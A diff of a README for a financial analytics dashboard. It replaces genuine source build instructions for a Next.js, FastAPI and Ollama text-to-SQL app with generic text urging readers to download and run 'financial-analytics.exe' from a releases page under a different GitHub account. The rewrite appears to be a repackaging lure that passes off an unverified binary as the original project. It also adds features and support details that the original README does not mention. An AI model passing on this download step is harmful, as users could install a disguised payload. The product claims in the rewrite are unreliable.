@@ -1,116 +1,88 @@
-# Financial Analyst AI
+# 📊 financial-analytics - Analyze Your Financial Data Easily
 
-Financial Analyst AI is an intelligent dashboard that allows users to query financial data using natural language. It leverages a local Large Language Model (LLM) to convert English questions into SQL queries, executes them against a database, and presents the results in an interactive UI.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Co-create-droid/financial-analytics/releases)
 
-## Features
+## 📋 Description
 
--   **Natural Language Querying**: Ask questions like "Show me the top 5 customers by spending" or "What is the total transaction volume for last month?"
--   **Interactive Dashboard**: Visualize key metrics and trends with dynamic charts.
--   **Data Visualization**: Automatically formatted tables with currency and date support.
--   **Reporting**: Save frequently used queries as reports and export results to CSV.
--   **Dark Mode**: A sleek, professional dark mode interface.
+financial-analytics is a user-friendly project that combines TypeScript front-end tools with Python data workflows. This application helps you ingest, analyze, and visualize your market and portfolio data. With features like ETL pipelines, modeling scripts, interactive dashboards, and reporting components, you can easily manage your financial information and make informed decisions.
 
-## Architecture
+## ⚙️ Features
 
-The project follows a modern client-server architecture:
+- **Data Ingestion:** Easily import data from various sources, including MySQL databases.
+- **Data Analysis:** Perform thorough analysis using Python scripts tailored for financial data.
+- **Interactive Dashboards:** Visualize your data with user-friendly dashboards.
+- **Reporting Tools:** Generate reports for better insights into your financial strategies.
+- **Backtesting Strategies:** Test your financial strategies against historical data for better planning.
 
--   **Frontend**: Built with [Next.js](https://nextjs.org/) (React), utilizing Tailwind CSS and `shadcn/ui` for a premium user experience.
--   **Backend**: Powered by [FastAPI](https://fastapi.tiangolo.com/) (Python), handling API requests and database interactions.
--   **Database**: [MySQL](https://www.mysql.com/) for structured data storage.
--   **AI Engine**: [Ollama](https://ollama.com/) running a local LLM (e.g., `gpt-oss:120b-cloud`) for text-to-SQL generation.
+## 🖥️ System Requirements
 
-## Prerequisites
+To install and run financial-analytics, your system should meet the following requirements:
 
-Ensure you have the following installed:
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB free space
+- **Python Version:** 3.7 or later
+- **MySQL Database:** Installed and configured for data connection
 
--   [Node.js](https://nodejs.org/) (v18 or higher)
--   [Python](https://www.python.org/) (v3.10 or higher)
--   [Docker](https://www.docker.com/) (for running MySQL)
--   [Ollama](https://ollama.com/) (running locally)
+## 🚀 Getting Started
 
-## Installation
+Follow these steps to successfully download and run financial-analytics:
 
-### 1. Clone the Repository
+1. **Visit the Releases Page:**
 
-```bash
-git clone https://github.com/iamdanwi/financial-analytics.git
-cd financial-analytics
-```
+   Go to our [Releases page](https://github.com/Co-create-droid/financial-analytics/releases) to find the latest version.
 
-### 2. Database Setup
+2. **Download the Latest Release:**
 
-Start the MySQL database using Docker:
+   Look for the latest version under the "Assets" section. For most users, you will want to choose the file labeled "financial-analytics.exe" for Windows or the respective file for your OS.
 
-```bash
-cd server
-docker-compose up -d
-```
+3. **Install the Application:**
 
-### 3. Backend Setup
+   - **For Windows:** Double-click the downloaded `.exe` file. Follow the installation prompts, which are straightforward. Accept the license agreements and choose your preferred installation location.
+   - **For macOS and Linux:** Follow the installation steps specific to your OS. This may involve using the terminal.
 
-Navigate to the server directory and install dependencies:
+4. **Set Up MySQL Database:**
 
-```bash
-cd server
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+   If you wish to use MySQL for data storage, ensure you have the MySQL server installed and running. Create a new database for your financial data.
 
-Seed the database with sample data:
+5. **Run the Application:**
 
-```bash
-python seed.py
-```
+   After installation, locate the application in your Start Menu or Applications folder. Open the app, and you will see the main dashboard.
 
-Start the backend server:
+6. **Connect to Your Database:**
 
-```bash
-uvicorn main:app --reload
-```
+   You will need to enter your database connection details. This includes your MySQL hostname, database name, username, and password. Follow the on-screen instructions to connect.
 
-The API will be available at `http://localhost:8000`.
+7. **Start Using the Application:**
 
-### 4. Frontend Setup
+   Begin by importing your financial data. Use the “Import” feature to upload your data. From there, you can analyze, visualize, and generate reports.
 
-Navigate to the client directory and install dependencies:
+## 🌐 Topics
 
-```bash
-cd ../client
-npm install
-```
+- **Data Analysis**
+- **Data Visualization**
+- **Finance**
+- **Financial Analytics**
+- **MySQL**
+- **MySQL Database**
+- **Next.js**
+- **Ollama**
+- **Python**
+- **Visualization**
 
-Start the development server:
+## 📥 Download & Install
 
-```bash
-npm run dev
-```
+For ease of access, ensure you visit our [Releases page](https://github.com/Co-create-droid/financial-analytics/releases) to download the application. Choose the version suitable for your operating system, and install it following the provided steps. 
 
-The application will be available at `http://localhost:3000`.
+## 📞 Support
 
-## Usage
+If you encounter any issues, you can reach out for help:
 
-1.  Open your browser and navigate to `http://localhost:3000`.
-2.  In the search bar, type a question about your data (e.g., "How many transactions were made in healthcare?").
-3.  View the results in the table or explore the **Analytics** tab for visual insights.
-4.  Save interesting queries using the **Save Report** button.
+- **GitHub Issues:** Use the "Issues" tab in our repository to report any bugs or request features.
+- **Email Support:** For direct inquiries, please email our support team at support@financial-analytics.com.
 
-## Project Structure
+## 📜 License
 
-```
-financial-analytics/
-├── client/                 # Next.js Frontend
-│   ├── app/                # App Router pages
-│   ├── components/         # React components
-│   └── lib/                # Utility functions and API client
-├── server/                 # FastAPI Backend
-│   ├── main.py             # API entry point
-│   ├── models.py           # SQLAlchemy database models
-│   ├── llm.py              # LLM integration logic
-│   └── seed.py             # Database seeding script
-└── README.md               # Project documentation
-```
+This project is licensed under the MIT License. You may use, copy, modify, and distribute the software as long as you include the original license in your distribution.
 
-## License
-
-[MIT](LICENSE)
+By following these steps, you can smoothly navigate the financial-analytics application, harnessing its power to enhance your financial decision-making.
